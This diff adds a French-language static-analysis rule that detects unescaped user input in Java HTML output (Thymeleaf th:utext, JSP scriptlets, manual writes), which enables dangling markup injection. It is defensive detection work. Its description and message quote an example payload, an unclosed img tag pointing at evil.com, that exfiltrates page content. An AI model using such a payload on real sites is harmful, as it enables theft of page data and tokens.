@@ -1,0 +1,41 @@
+id: dangling-markup
+language: java
+category: modern
+cwe: CWE-79
+owasp: A03:2021-Injection
+severity: medium
+confidence_default: medium
+
+match:
+  type: ast-pattern
+  description: >
+    Détecte une entrée utilisateur injectée dans un attribut HTML ou un
+    fragment de page (Thymeleaf `th:utext`, JSP `<%= %>` non échappé,
+    concaténation directe dans un `StringBuilder` de réponse) sans
+    échappement, permettant l'injection d'un tag HTML tronqué (ex:
+    `<img src="https://evil.com/?`) qui exfiltre le reste du document
+    (dangling markup injection) même quand le CSP bloque l'exécution de
+    script.
+  patterns:
+    - "th:utext=\"${$userInput}\" // Thymeleaf, pas d'échappement automatique"
+    - "<%= $userInput %> // JSP scriptlet, sortie brute non échappée"
+    - "response.getWriter().write(string_concat(_, $userInput, _)) // fragment HTML construit manuellement sans échappement"
+  exclude_if:
+    - "La sortie utilise th:text (échappement automatique Thymeleaf) au lieu de th:utext"
+    - "L'entrée passe par un encodeur HTML (ex: OWASP Java Encoder, HtmlUtils.htmlEscape) avant insertion dans le document"
+
+message: >
+  Une entrée utilisateur est insérée dans le HTML de la réponse sans
+  échappement — même en présence d'un CSP strict bloquant les scripts, un
+  attaquant peut injecter un tag HTML non fermé (ex: `<img src="https://
+  evil.com/?`) qui capture et exfiltre le reste du contenu de la page vers
+  un serveur externe (dangling markup injection). Échapper systématiquement
+  toute donnée utilisateur insérée en HTML (`th:text`, OWASP Java Encoder)
+  et ne jamais utiliser `th:utext`/sortie brute avec une entrée non fiable.
+
+false_positive_notes:
+  - "Si l'entrée est strictement filtrée à un sous-ensemble de caractères sans '<' ni '\"' possible, le risque est atténué — reclasser en `low`."
+  - "Si le contenu inséré provient d'une source interne non contrôlable par l'utilisateur final, ce n'est pas exploitable."
+
+remediation_ref: rules/remediation/dangling-markup.md
+knowledge_ref: knowledge/modern/dangling-markup.md
